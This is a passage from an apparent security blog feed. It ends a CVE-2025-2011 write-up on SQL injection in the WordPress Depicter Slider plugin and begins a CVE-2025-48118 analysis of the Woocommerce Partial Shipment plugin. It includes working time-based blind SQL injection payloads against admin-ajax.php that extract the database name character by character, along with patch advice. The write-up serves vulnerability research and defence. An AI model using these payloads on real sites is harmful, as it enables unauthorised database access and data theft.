\n    id=\"codeblock-id-83\" \n    class=\"\n      chroma \n      !tw-block \n      tw-p-0\n      tw-m-0\n      tw-transition-[max-height] \n      tw-duration-500 \n      tw-ease-in-out \n      group-[.is-closed]:!tw-max-h-0 \n      group-[.is-wrap]:tw-text-wrap\n      tw-overflow-y-hidden\n      tw-overflow-x-auto\n      tw-scrollbar-thin\n      \"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eAND\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elf\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003evalue\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003elike\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;999%\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eAND\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eSLEEP\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e-- \u0026#39; OR leadtable.content_name like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #\u0026#39;)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003cp\u003e\u003cfigure\u003e\u003ca class=\"lightgallery\" href=\"/2025-09-30-cve-2025-2011/resp_time.png\" title=\"response time\" data-thumbnail=\"/2025-09-30-cve-2025-2011/resp_time.png\" data-sub-html=\"\u003ch2\u003eResponse time showing the payload execution\u003c/h2\u003e\u003cp\u003eresponse time\u003c/p\u003e\"\u003e\u003cimg  loading=\"lazy\" src='/2025-09-30-cve-2025-2011/resp_time.png' srcset=\"/2025-09-30-cve-2025-2011/resp_time_hu_a28c2b2f97a5a2cf.webp 800w, /2025-09-30-cve-2025-2011/resp_time_hu_ba48de0d0725bf3c.webp 1200w, /2025-09-30-cve-2025-2011/resp_time_hu_edd9c81d7d6ff58b.webp 1600w\"  alt=\"response time\" height=\"293\" width=\"434\"\u003e\u003c/a\u003e\u003cfigcaption class=\"image-caption\"\u003eResponse time showing the payload execution\u003c/figcaption\u003e\n\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e👉 The delayed response confirms the injection worked.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSubquery in FROM clause\u003c/strong\u003e: The subquery acts as a temporary table, forcing MySQL to execute it first, delaying the main query execution.\u003c/p\u003e\n\u003ch3 id=\"get-first-letter-of-database-name\" class=\"headerLink\"\u003e\n    \u003ca href=\"#get-first-letter-of-database-name\" class=\"header-mark\"\u003e\u003c/a\u003e33.2 Get First Letter of Database Name\u003c/h3\u003e\u003cp\u003eTo fully dump data, we must first confirm we can extract at least one character of the database name.\u003c/p\u003e\n\u003cp\u003eSend a request with the following \u003cstrong\u003eSQLi payload\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-open show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-none !tw-my-1\"\u003ehttp\u003c/p\u003e\n      \u003c/button\u003e\n\n   \u003cdiv class=\"tw-flex\"\u003e\n      \u003cbutton \n        class=\"\n          line-number-button\n          tw-mx-2 \n          tw-hidden \n          group-[.is-open]:tw-block \n          group-[.show-line-numbers]:tw-text-fgColor-link \n          print:!tw-hidden\" \n        title=\"Toggle line numbers\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M61.77 401l17.5-20.15a19.92 19.92 0 0 0 5.07-14.19v-3.31C84.34 356 80.5 352 73 352H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8h22.83a157.41 157.41 0 0 0-11 12.31l-5.61 7c-4 5.07-5.25 10.13-2.8 14.88l1.05 1.93c3 5.76 6.29 7.88 12.25 7.88h4.73c10.33 0 15.94 2.44 15.94 9.09 0 4.72-4.2 8.22-14.36 8.22a41.54 41.54 0 0 1-15.47-3.12c-6.49-3.88-11.74-3.5-15.6 3.12l-5.59 9.31c-3.72 6.13-3.19 11.72 2.63 15.94 7.71 4.69 20.38 9.44 37 9.44 34.16 0 48.5-22.75 48.5-44.12-.03-14.38-9.12-29.76-28.73-34.88zM496 224H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zm0-160H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16V80a16 16 0 0 0-16-16zm0 320H176a16 16 0 0 0-16 16v32a16 16 0 0 0 16 16h320a16 16 0 0 0 16-16v-32a16 16 0 0 0-16-16zM16 160h64a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H64V40a8 8 0 0 0-8-8H32a8 8 0 0 0-7.14 4.42l-8 16A8 8 0 0 0 24 64h8v64H16a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8zm-3.91 160H80a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H41.32c3.29-10.29 48.34-18.68 48.34-56.44 0-29.06-25-39.56-44.47-39.56-21.36 0-33.8 10-40.46 18.75-4.37 5.59-3 10.84 2.8 15.37l8.58 6.88c5.61 4.56 11 2.47 16.12-2.44a13.44 13.44 0 0 1 9.46-3.84c3.33 0 9.28 1.56 9.28 8.75C51 248.19 0 257.31 0 304.59v4C0 316 5.08 320 12.09 320z\"/\u003e\u003c/svg\u003e\u003c/button\u003e\n\n      \u003cbutton \n        class=\"\n          wrap-code-button\n          tw-select-none \n          tw-mx-2 \n          tw-hidden \n          group-[.is-open]:tw-block \n          group-[.is-wrap]:tw-text-fgColor-link \n          print:!tw-hidden\" \n        title=\"Toggle code wrap\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z\"/\u003e\u003c/svg\u003e\u003c/button\u003e\n      \n      \u003cbutton \n        class=\"\n          copy-code-button\n          tw-select-none\n          tw-mx-2 \n          tw-hidden\n          group-[.is-open]:tw-block\n          hover:tw-text-fgColor-link \n          print:!tw-hidden\"\n        title=\"Copy code\"\u003e\n          \u003cspan class=\"copy-icon tw-block\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 448 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M433.941 65.941l-51.882-51.882A48 48 0 0 0 348.118 0H176c-26.51 0-48 21.49-48 48v48H48c-26.51 0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51 0 48-21.49 48-48v-48h80c26.51 0 48-21.49 48-48V99.882a48 48 0 0 0-14.059-33.941zM266 464H54a6 6 0 0 1-6-6V150a6 6 0 0 1 6-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 0 1-6 6zm128-96H182a6 6 0 0 1-6-6V54a6 6 0 0 1 6-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 0 1-6 6zm6-256h-64V48h9.632c1.591 0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 0 1 1.757 4.243V112z\"/\u003e\u003c/svg\u003e\u003c/span\u003e\n          \u003cspan class=\"check-icon tw-hidden\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z\"/\u003e\u003c/svg\u003e\u003c/span\u003e\n      \u003c/button\u003e\n        \n      \u003cbutton \n        class=\"\n          tw-select-none \n          tw-mx-2 \n          tw-block \n          group-[.is-open]:tw-hidden \n          print:!tw-hidden\" \n        disabled\n        aria-hidden=\"true\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z\"/\u003e\u003c/svg\u003e\u003c/button\u003e\n    \u003c/div\u003e\n  \u003c/div\u003e\n  \u003cpre style=\"counter-reset: codeblock;\" class=\"tw-block tw-m-0 tw-p-0\"\u003e\u003ccode \n    id=\"codeblock-id-84\" \n    class=\"\n      chroma \n      !tw-block \n      tw-p-0\n      tw-m-0\n      tw-transition-[max-height] \n      tw-duration-500 \n      tw-ease-in-out \n      group-[.is-closed]:!tw-max-h-0 \n      group-[.is-wrap]:tw-text-wrap\n      tw-overflow-y-hidden\n      tw-overflow-x-auto\n      tw-scrollbar-thin\n      \"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+\u003c/span\u003e \u003cspan class=\"kr\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eHost\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"l\"\u003elocalhost\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"g\"\u003eCookie: cookie_here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eSUBSTRING()\u003c/code\u003e extracts the first letter of the \u003cstrong\u003edatabase name\u003c/strong\u003e, and \u003ccode\u003eIF()\u003c/code\u003e triggers \u003ccode\u003eSLEEP(5)\u003c/code\u003e if the first character equals \u003ccode\u003e0x77\u003c/code\u003e (\u003ccode\u003e'w'\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eHex encoding (\u003ccode\u003e0x77\u003c/code\u003e) is used because \u003ccode\u003es\u003c/code\u003e originates from a \u003cstrong\u003eGET\u003c/strong\u003e parameter and is escaped by \u003ca href=\"https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes\" target=\"_blank\" rel=\"noopener noreferrer\"\u003emagic quotes\u003c/a\u003e and \u003ccode\u003esanitize_text_field\u003c/code\u003e in WordPress.\u003c/p\u003e\n\u003cp\u003e👉 The delayed response confirms the first character is indeed \u003ccode\u003ew\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"conclusion\" class=\"headerLink\"\u003e\n    \u003ca href=\"#conclusion\" class=\"header-mark\"\u003e\u003c/a\u003e34 Conclusion\u003c/h2\u003e\u003cp\u003eThe \u003cstrong\u003eCVE-2025-2011\u003c/strong\u003e vulnerability in the WordPress \u003cstrong\u003eDepicter Slider\u003c/strong\u003e plugin (prior to version \u003cstrong\u003e3.6.2\u003c/strong\u003e) arises from unvalidated user input being directly injected into SQL queries, leading to SQL Injection.\u003c/p\u003e\n\u003cp\u003eThe patch introduces SQL escaping, ensuring injected data is safely encapsulated within \u003ccode\u003e'%...%'\u003c/code\u003e strings.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKey takeaways\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlways validate and sanitize user input.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003e$wpdb-\u0026gt;prepare()\u003c/code\u003e when handling database queries in WordPress.\u003c/li\u003e\n\u003cli\u003eKeep plugins updated and conduct regular security audits to reduce exposure.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"references\" class=\"headerLink\"\u003e\n    \u003ca href=\"#references\" class=\"header-mark\"\u003e\u003c/a\u003e35 References\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/cheat-sheet\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eSQL Injection Cheat Sheet - PortSwigger\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress Depicter Slider Plugin \u0026lt;= 3.6.1 is vulnerable to SQL Injection\u003c/a\u003e\u003c/p\u003e",
        "language": "en"
    },
    {
        "title" : "CVE-2025-48118 Analysis \u0026 POC",
        "date_published" : "2025-09-29T19:54:00+07:00",
        "date_modified" : "2025-09-29T19:54:00+07:00",
        "id" : "http://localhost:1313/2025-09-29-cve-2025-48118/",
        "url" : "http://localhost:1313/2025-09-29-cve-2025-48118/",
        "content_html" : "\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e plugin for WordPress prior to version \u003cstrong\u003e3.3\u003c/strong\u003e.\u003cbr\u003e\nIt allows attackers to directly interact with the database, potentially leading to data theft and other attacks.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48118\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eCVE-2025-48118\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/wc-partial-shipment/advanced/\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress Woocommerce Partial Shipment Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\" class=\"headerLink\"\u003e\n    \u003ca href=\"#requirements\" class=\"header-mark\"\u003e\u003c/a\u003e11 Requirements\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/2025-08-21-wordpress-local-and-debugging/\" target=\"_blank\" rel=\"noopener noreferrer\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e: v3.2 (vulnerable) and v3.3 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any comparison tool to view differences between versions\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActivated WooCommerce Plugin\u003c/strong\u003e: must be \u003cstrong\u003eactivated\u003c/strong\u003e before installing \u003cstrong\u003eWoocommerce Partial Shipment Plugin\u003c/strong\u003e, since several WooCommerce functions are used.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\" class=\"headerLink\"\u003e\n    \u003ca href=\"#analysis\" class=\"header-mark\"\u003e\u003c/a\u003e12 Analysis\u003c/h2\u003e\u003cp\u003eThe root cause lies in directly injecting \u003cstrong\u003ePOST\u003c/strong\u003e request data into an SQL query without proper sanitization or validation.\u003c/p\u003e\n\u003ch3 id=\"patch-diff\" class=\"headerLink\"\u003e\n    \u003ca href=\"#patch-diff\" class=\"header-mark\"\u003e\u003c/a\u003e12.1 Patch Diff\u003c/h3\u003e\u003cp\u003eUse any diff tool to compare the vulnerable and patched versions.\u003cbr\u003e\nA significant difference appears in \u003cstrong\u003ewc-partial-shipment/woocommerce-partial-shipment.php\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eHowever, since the developer made many changes, locating the vulnerable line can be difficult.\u003c/p\u003e\n\u003cblockquote\u003e\n  \u003cp\u003eIn WordPress, for SQLi to occur, the application must interact with the database using the global variable \u003ccode\u003e$wpdb\u003c/code\u003e.\u003cbr\u003e\nSearching for this keyword inside \u003cstrong\u003ewc-partial-shipment/woocommerce-partial-shipment.php\u003c/strong\u003e helps identify possible sinks.\u003c/p\u003e\n\n\u003c/blockquote\u003e\u003cp\u003e\u003cfigure\u003e\u003ca class=\"lightgallery\" href=\"/2025-09-29-cve-2025-48118/search_sink.png\" title=\"search sink\" data-thumbnail=\"/2025-09-29-cve-2025-48118/search_sink.png\" data-sub-html=\"\u003ch2\u003eSink location found in source code\u003c/h2\u003e\u003cp\u003esearch sink\u003c/p\u003e\"\u003e\u003cimg  loading=\"lazy\" src='/2025-09-29-cve-2025-48118/search_sink.png' srcset=\"/2025-09-29-cve-2025-48118/search_sink_hu_5241f0ab9621d71f.webp 800w, /2025-09-29-cve-2025-48118/search_sink_hu_a82a123e30ef104a.webp 1200w, /2025-09-29-cve-2025-48118/search_sink_hu_d808bde226445d66.webp 1600w\"  alt=\"search sink\" height=\"469\" width=\"1067\"\u003e\u003c/a\u003e\u003cfigcaption class=\"image-caption\"\u003eSink location found in source code\u003c/figcaption\u003e\n\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eget_shipment_id\u003c/code\u003e and \u003ccode\u003eget_wxp_shipment_data\u003c/code\u003e are two functions in the \u003cstrong\u003eWXP_Partial_Shipment\u003c/strong\u003e class that directly insert user input into SQL queries without validation, making them vulnerable to SQL Injection.\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003ca class=\"lightgallery\" href=\"/2025-09-29-cve-2025-48118/patch.png\" title=\"Patch\" data-thumbnail=\"/2025-09-29-cve-2025-48118/patch.png\" data-sub-html=\"\u003ch2\u003eComparison between vulnerable and patched version\u003c/h2\u003e\u003cp\u003ePatch\u003c/p\u003e\"\u003e\u003cimg  loading=\"lazy\" src='/2025-09-29-cve-2025-48118/patch.png' srcset=\"/2025-09-29-cve-2025-48118/patch_hu_1c55fa59061ee81a.webp 800w, /2025-09-29-cve-2025-48118/patch_hu_970ff0950fcf33e0.webp 1200w, /2025-09-29-cve-2025-48118/patch_hu_242e0e8277738fe3.webp 1600w\"  alt=\"Patch\" height=\"508\" width=\"1261\"\u003e\u003c/a\u003e\u003cfigcaption class=\"image-caption\"\u003eComparison between vulnerable and patched version\u003c/figcaption\u003e\n\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003eThe patch uses \u003ccode\u003e$wpdb-\u0026gt;prepare()\u003c/code\u003e to safely construct SQL queries instead of \u003cstrong\u003edirect string concatenation\u003c/strong\u003e with user input.\u003cbr\u003e\nThis ensures all values are \u003cstrong\u003eproperly escaped\u003c/strong\u003e before being inserted into the SQL query, effectively mitigating SQL Injection risks.\u003c/p\u003e\n\u003ch3 id=\"how-it-works\" class=\"headerLink\"\u003e\n    \u003ca href=\"#how-it-works\" class=\"header-mark\"\u003e\u003c/a\u003e12.2 How it works\u003c/h3\u003e\u003cp\u003eBoth \u003ccode\u003eget_shipment_id\u003c/code\u003e and \u003ccode\u003eget_wxp_shipment_data\u003c/code\u003e are called by the function \u003ccode\u003ewxp_order_set_shipped\u003c/code\u003e within the same class.\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-closed show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-none !tw-my-1\"\u003ephp\u003c/p\u003e\n      \u003c/button\u003e\n\n   \u003cdiv class=\"tw-flex\"\u003e\n      \u003cbutton \n        class=\"\n          line-number-button\n          tw-mx-2 \n          tw-hidden \n          group-[.is-open]:tw-block \n          group-[.show-line-numbers]:tw-text-fgColor-link \n          print:!tw-hidd